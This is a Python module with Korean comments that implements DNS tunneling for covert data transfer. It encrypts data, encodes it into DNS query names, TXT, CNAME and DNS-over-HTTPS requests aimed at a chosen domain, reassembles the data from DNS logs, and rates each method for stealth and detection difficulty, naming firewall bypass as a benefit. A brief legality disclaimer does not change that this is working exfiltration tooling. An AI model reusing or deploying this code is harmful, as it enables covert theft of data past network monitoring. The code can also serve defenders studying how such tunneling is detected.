"""
DNS 터널링 모듈 v3.0

DNS 프로토콜을 이용한 데이터 은닉 및 터널링 기법들을 구현합니다:
- DNS 쿼리 이름 인코딩
- DNS 응답 데이터 은닉
- TXT 레코드 활용
- CNAME 체이닝
- DNS over HTTPS (DoH) 터널링
"""

import socket
import struct
import base64
import random
import time
import threading
import queue
import hashlib
from typing import List, Tuple, Dict, Optional, Union, Any
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import dns.resolver
import dns.message
import dns.query
import dns.name
import dns.rdatatype
import dns.rdata
import requests
import json


class DNSTunneling:
    """
    DNS 터널링 클래스
    
    DNS 프로토콜을 이용하여 데이터 은닉 및 터널링을 구현합니다.
    """
    
    def __init__(self):
        """클래스 초기화"""
        self.base_domain = "example.com"  # 실제 사용시 소유한 도메인 사용
        self.max_label_length = 63  # DNS 라벨 최대 길이
        self.max_query_length = 253  # DNS 쿼리 최대 길이
        self.chunk_size = 32  # 데이터 청크 크기
        self.encoding_methods = ['base32', 'base64', 'hex', 'binary']
        
        # DNS 서버 설정
        self.dns_servers = [
            '8.8.8.8',    # Google DNS
            '1.1.1.1',    # Cloudflare DNS
            '9.9.9.9'     # Quad9 DNS
        ]
        
        # DoH 서버 설정
        self.doh_servers = [
            'https://dns.google/dns-query',
            'https://cloudflare-dns.com/dns-query',
            'https://dns.quad9.net/dns-query'
        ]
        
        self.session_id = random.randint(10000, 99999)
        self.sequence = 0
    
    def tunnel_data_query(self, data: bytes, target_domain: str,
                         encoding: str = 'base32', password: Optional[str] = None) -> bool:
        """
        DNS 쿼리 이름에 데이터를 인코딩하여 터널링합니다.
        
        Args:
            data: 터널링할 데이터
            target_domain: 대상 도메인
            encoding: 인코딩 방법 ('base32', 'base64', 'hex')
            password: 암호화 패스워드 (선택사항)
            
        Returns:
            bool: 성공 시 True, 실패 시 False
        """
        try:
            # 데이터 암호화 (필요시)
            if password:
                data = self._encrypt_data(data, password)
            
            # 데이터 인코딩
            encoded_data = self._encode_data(data, encoding)
            
            # 데이터를 DNS 쿼리 크기에 맞게 분할
            chunks = self._split_data_for_dns(encoded_data, target_domain)
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = self.dns_servers
            
            for i, chunk in enumerate(chunks):
                # DNS 쿼리 생성
                query_name = f"{self.session_id}.{i}.{chunk}.{target_domain}"
                
                try:
                    # A 레코드 쿼리 시도
                    result = resolver.resolve(query_name, 'A')
                    print(f"청크 {i+1}/{len(chunks)} 전송됨: {query_name[:50]}...")
                    
                except dns.resolver.NXDOMAIN:
                    # 도메인이 존재하지 않아도 쿼리는 전송됨
                    print(f"청크 {i+1}/{len(chunks)} 전송됨 (NXDOMAIN): {query_name[:50]}...")
                    pass
                except Exception as e:
                    print(f"DNS 쿼리 오류: {str(e)}")
                    continue
                
                time.sleep(0.1)  # 쿼리 간 간격
            
            return True
            
        except Exception as e:
            print(f"DNS 터널링 중 오류 발생: {str(e)}")
            return False
    
    def tunnel_data_txt(self, data: bytes, target_domain: str,
                       password: Optional[str] = None) -> bool:
        """
        TXT 레코드를 이용한 데이터 터널링입니다.
        
        Args:
            data: 터널링할 데이터
            target_domain: 대상 도메인
            password: 암호화 패스워드 (선택사항)
            
        Returns:
            bool: 성공 시 True, 실패 시 False
        """
        try:
            # 데이터 암호화 (필요시)
            if password:
                data = self._encrypt_data(data, password)
            
            # Base64 인코딩
            encoded_data = base64.b64encode(data).decode('ascii')
            
            # TXT 레코드 최대 길이 (255자)에 맞게 분할
            chunk_size = 200  # 안전 마진 고려
            chunks = [encoded_data[i:i+chunk_size] 
                     for i in range(0, len(encoded_data), chunk_size)]
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = self.dns_servers
            
            for i, chunk in enumerate(chunks):
                # TXT 레코드 쿼리 시도
                query_name = f"txt{i}-{self.session_id}.{target_domain}"
                
                try:
                    result = resolver.resolve(query_name, 'TXT')
                    print(f"TXT 청크 {i+1}/{len(chunks)} 쿼리됨")
                    
                except dns.resolver.NXDOMAIN:
                    print(f"TXT 청크 {i+1}/{len(chunks)} 쿼리됨 (NXDOMAIN)")
                    pass
                except Exception as e:
                    print(f"TXT 쿼리 오류: {str(e)}")
                    continue
                
                time.sleep(0.1)
            
            return True
            
        except Exception as e:
            print(f"TXT 터널링 중 오류 발생: {str(e)}")
            return False
    
    def tunnel_data_cname(self, data: bytes, target_domain: str,
                         password: Optional[str] = None) -> bool:
        """
        CNAME 체이닝을 이용한 데이터 터널링입니다.
        
        Args:
            data: 터널링할 데이터
            target_domain: 대상 도메인
            password: 암호화 패스워드 (선택사항)
            
        Returns:
            bool: 성공 시 True, 실패 시 False
        """
        try:
            # 데이터 암호화 (필요시)
            if password:
                data = self._encrypt_data(data, password)
            
            # Hex 인코딩 (CNAME은 길이 제한이 있음)
            encoded_data = data.hex()
            
            # CNAME 체인 생성
            chunks = self._split_data_for_dns(encoded_data, target_domain, max_chunk=16)
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = self.dns_servers
            
            # CNAME 체인으로 연결된 쿼리 생성
            current_domain = target_domain
            
            for i, chunk in enumerate(chunks):
                query_name = f"cname{i}-{chunk}-{self.session_id}.{current_domain}"
                
                try:
                    result = resolver.resolve(query_name, 'CNAME')
                    print(f"CNAME 청크 {i+1}/{len(chunks)} 쿼리됨")
                    
                except dns.resolver.NXDOMAIN:
                    print(f"CNAME 청크 {i+1}/{len(chunks)} 쿼리됨 (NXDOMAIN)")
                    pass
                except Exception as e:
                    print(f"CNAME 쿼리 오류: {str(e)}")
                    continue
                
                # 다음 체인을 위한 도메인 업데이트
                current_domain = f"chain{i}.{target_domain}"
                time.sleep(0.1)
            
            return True
            
        except Exception as e:
            print(f"CNAME 터널링 중 오류 발생: {str(e)}")
            return False
    
    def tunnel_data_doh(self, data: bytes, password: Optional[str] = None) -> bool:
        """
        DNS over HTTPS (DoH)를 이용한 데이터 터널링입니다.
        
        Args:
            data: 터널링할 데이터
            password: 암호화 패스워드 (선택사항)
            
        Returns:
            bool: 성공 시 True, 실패 시 False
        """
        try:
            # 데이터 암호화 (필요시)
            if password:
                data = self._encrypt_data(data, password)
            
            # Base64 인코딩
            encoded_data = base64.b64encode(data).decode('ascii')
            
            # DoH 쿼리를 위한 청크 분할
            chunk_size = 50  # DoH URL 길이 제한 고려
            chunks = [encoded_data[i:i+chunk_size] 
                     for i in range(0, len(encoded_data), chunk_size)]
            
            headers = {
                'Accept': 'application/dns-message',
                'Content-Type': 'application/dns-message',
                'User-Agent': 'DNS-Tunnel-Client/1.0'
            }
            
            for i, chunk in enumerate(chunks):
                # DNS 쿼리 메시지 생성
                query_name = f"doh{i}-{chunk}-{self.session_id}.{self.base_domain}"
                
                # 여러 DoH 서버에 순환 전송
                doh_server = self.doh_servers[i % len(self.doh_servers)]
                
                try:
                    # GET 방식 DoH 쿼리
                    params = {
                        'name': query_name,
                        'type': 'A',
                        'ct': 'application/dns-json'
                    }
                    
                    response = requests.get(doh_server, params=params, 
                                          headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"DoH 청크 {i+1}/{len(chunks)} 전송됨")
                    else:
                        print(f"DoH 청크 {i+1}/{len(chunks)} 오류: {response.status_code}")
                    
                except requests.exceptions.RequestException as e:
                    print(f"DoH 요청 오류: {str(e)}")
                    continue
                
                time.sleep(0.2)  # DoH 서버 부하 고려
            
            return True
            
        except Exception as e:
            print(f"DoH 터널링 중 오류 발생: {str(e)}")
            return False
    
    def extract_from_dns_log(self, log_file: str, target_domain: str,
                           encoding: str = 'base32', password: Optional[str] = None) -> Optional[bytes]:
        """
        DNS 로그에서 터널링된 데이터를 추출합니다.
        
        Args:
            log_file: DNS 로그 파일 경로
            target_domain: 대상 도메인
            encoding: 인코딩 방법
            password: 복호화 패스워드 (선택사항)
            
        Returns:
            bytes: 추출된 데이터 또는 None
        """
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                log_content = f.read()
            
            # 세션 ID와 관련된 쿼리 검색
            session_queries = {}
            
            lines = log_content.split('\n')
            for line in lines:
                if target_domain in line and str(self.session_id) in line:
                    # DNS 쿼리 파싱 (로그 형식에 따라 조정 필요)
                    parts = line.split()
                    for part in parts:
                        if target_domain in part and str(self.session_id) in part:
                            # 쿼리 이름에서 데이터 추출
                            query_parts = part.split('.')
                            if len(query_parts) >= 3:
                                session_id = query_parts[0]
                                sequence = query_parts[1]
                                data_chunk = query_parts[2]
                                
                                if session_id == str(self.session_id):
                                    session_queries[int(sequence)] = data_chunk
                            break
            
            if not session_queries:
                return None
            
            # 시퀀스 순서대로 데이터 재조합
            reconstructed_data = ""
            for seq in sorted(session_queries.keys()):
                reconstructed_data += session_queries[seq]
            
            # 데이터 디코딩
            decoded_data = self._decode_data(reconstructed_data, encoding)
            
            # 데이터 복호화 (필요시)
            if password:
                decoded_data = self._decrypt_data(decoded_data, password)
            
            return decoded_data
            
        except Exception as e:
            print(f"DNS 로그 추출 중 오류 발생: {str(e)}")
            return None
    
    def _encode_data(self, data: bytes, encoding: str) -> str:
        """데이터를 지정된 방법으로 인코딩합니다."""
        try:
            if encoding == 'base32':
                return base64.b32encode(data).decode('ascii').lower().rstrip('=')
            elif encoding == 'base64':
                return base64.b64encode(data).decode('ascii').rstrip('=')
            elif encoding == 'hex':
                return data.hex()
            elif encoding == 'binary':
                return ''.join(format(byte, '08b') for byte in data)
            else:
                raise ValueError(f"지원하지 않는 인코딩: {encoding}")
                
        except Exception as e:
            raise Exception(f"데이터 인코딩 오류: {str(e)}")
    
    def _decode_data(self, encoded_data: str, encoding: str) -> bytes:
        """인코딩된 데이터를 원래 형태로 디코딩합니다."""
        try:
            if encoding == 'base32':
                # Base32 패딩 복원
                padding_length = 8 - (len(encoded_data) % 8)
                if padding_length != 8:
                    encoded_data += '=' * padding_length
                return base64.b32decode(encoded_data.upper())
                
            elif encoding == 'base64':
                # Base64 패딩 복원
                padding_length = 4 - (len(encoded_data) % 4)
                if padding_length != 4:
                    encoded_data += '=' * padding_length
                return base64.b64decode(encoded_data)
                
            elif encoding == 'hex':
                return bytes.fromhex(encoded_data)
                
            elif encoding == 'binary':
                # 8비트 단위로 자르고 바이트로 변환
                padding_length = 8 - (len(encoded_data) % 8)
                if padding_length != 8:
                    encoded_data += '0' * padding_length
                
                bytes_list = []
                for i in range(0, len(encoded_data), 8):
                    byte_str = encoded_data[i:i+8]
                    if len(byte_str) == 8:
                        bytes_list.append(int(byte_str, 2))
                return bytes(bytes_list)
            else:
                raise ValueError(f"지원하지 않는 인코딩: {encoding}")
                
        except Exception as e:
            raise Exception(f"데이터 디코딩 오류: {str(e)}")
    
    def _split_data_for_dns(self, data: str, domain: str, max_chunk: int = None) -> List[str]:
        """데이터를 DNS 쿼리 크기에 맞게 분할합니다."""
        if max_chunk is None:
            # DNS 라벨 최대 길이와 전체 쿼리 길이 고려
            available_length = self.max_query_length - len(domain) - 20  # 여유분
            max_chunk = min(self.max_label_length, available_length // 3)  # 세션ID, 시퀀스 고려
        
        chunks = []
        for i in range(0, len(data), max_chunk):
            chunk = data[i:i+max_chunk]
            chunks.append(chunk)
        
        return chunks
    
    def analyze_dns_capacity(self, method: str) -> Dict[str, Union[int, str]]:
        """
        DNS 터널링의 용량을 분석합니다.
        
        Args:
            method: 분석할 방법 ('query', 'txt', 'cname', 'doh')
            
        Returns:
            dict: 분석 결과
        """
        analysis = {
            'method': method,
            'bytes_per_query': 0,
            'queries_per_minute': 0,
            'bandwidth_bps': 0,
            'stealth_rating': 0,
            'detection_difficulty': 'Unknown'
        }
        
        if method == 'query':
            analysis.update({
                'bytes_per_query': 20,  # 인코딩 오버헤드 고려
                'queries_per_minute': 600,  # 초당 10쿼리
                'bandwidth_bps': 200,  # 20 * 10
                'stealth_rating': 7,
                'detection_difficulty': 'Medium'
            })
            
        elif method == 'txt':
            analysis.update({
                'bytes_per_query': 150,  # TXT 레코드 용량
                'queries_per_minute': 300,  # 초당 5쿼리
                'bandwidth_bps': 750,
                'stealth_rating': 6,
                'detection_difficulty': 'Medium'
            })
            
        elif method == 'cname':
            analysis.update({
                'bytes_per_query': 8,  # CNAME 제한
                'queries_per_minute': 240,  # 초당 4쿼리
                'bandwidth_bps': 32,
                'stealth_rating': 8,
                'detection_difficulty': 'Hard'
            })
            
        elif method == 'doh':
            analysis.update({
                'bytes_per_query': 30,  # DoH 오버헤드
                'queries_per_minute': 120,  # 초당 2쿼리 (서버 부하 고려)
                'bandwidth_bps': 60,
                'stealth_rating': 9,
                'detection_difficulty': 'Very Hard'
            })
        
        return analysis
    
    def _encrypt_data(self, data: bytes, password: str) -> bytes:
        """AES-256-GCM을 사용한 데이터 암호화"""
        try:
            key = hashlib.sha256(password.encode('utf-8')).digest()
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, auth_tag = cipher.encrypt_and_digest(data)
            return cipher.nonce + auth_tag + ciphertext
            
        except Exception as e:
            raise Exception(f"암호화 오류: {str(e)}")
    
    def _decrypt_data(self, encrypted_data: bytes, password: str) -> bytes:
        """AES-256-GCM을 사용한 데이터 복호화"""
        try:
            if len(encrypted_data) < 32:
                raise ValueError("암호화된 데이터가 너무 짧습니다")
            
            key = hashlib.sha256(password.encode('utf-8')).digest()
            
            nonce = encrypted_data[:16]
            auth_tag = encrypted_data[16:32]
            ciphertext = encrypted_data[32:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            data = cipher.decrypt_and_verify(ciphertext, auth_tag)
            
            return data
            
        except Exception as e:
            raise Exception(f"복호화 오류: {str(e)}")


# 사용 예제
if __name__ == "__main__":
    # DNS 터널링 인스턴스 생성
    dns_tunnel = DNSTunneling()
    
    print("🔗 DNS 터널링 테스트")
    print("=" * 50)
    
    # 각 방법별 용량 분석
    methods = ['query', 'txt', 'cname', 'doh']
    
    for method in methods:
        analysis = dns_tunnel.analyze_dns_capacity(method)
        print(f"\n📊 {method.upper()} 방법 분석:")
        print(f"   쿼리당 바이트: {analysis['bytes_per_query']}")
        print(f"   분당 쿼리: {analysis['queries_per_minute']}")
        print(f"   대역폭: {analysis['bandwidth_bps']} bps")
        print(f"   은밀성 점수: {analysis['stealth_rating']}/10")
        print(f"   탐지 난이도: {analysis['detection_difficulty']}")
    
    print(f"\n💡 DNS 터널링 특징:")
    print("- 높은 대역폭: TXT 레코드 방법")
    print("- 높은 은밀성: DoH 방법")
    print("- 방화벽 우회 효과적")
    print("- 로그 분석으로 탐지 가능")
    
    print(f"\n⚠️ 주의사항:")
    print("- 실제 소유한 도메인 필요")
    print("- DNS 서버 로그에 기록됨")
    print("- 과도한 쿼리 시 차단 가능")
    print("- 법적 허용 범위 내에서만 사용")
    
    # 테스트 데이터 터널링 시뮬레이션
    test_data = b"This is a secret message for DNS tunneling test!"
    target_domain = "test.example.com"
    
    print(f"\n🧪 시뮬레이션 테스트:")
    print(f"데이터: {test_data.decode()}")
    print(f"도메인: {target_domain}")
    
    # Base32 인코딩 테스트
    encoded = dns_tunnel._encode_data(test_data, 'base32')
    print(f"Base32 인코딩: {encoded[:50]}...")
    
    # 청크 분할 테스트
    chunks = dns_tunnel._split_data_for_dns(encoded, target_domain)
    print(f"청크 수: {len(chunks)}")
    print(f"첫 번째 청크: {chunks[0] if chunks else 'None'}")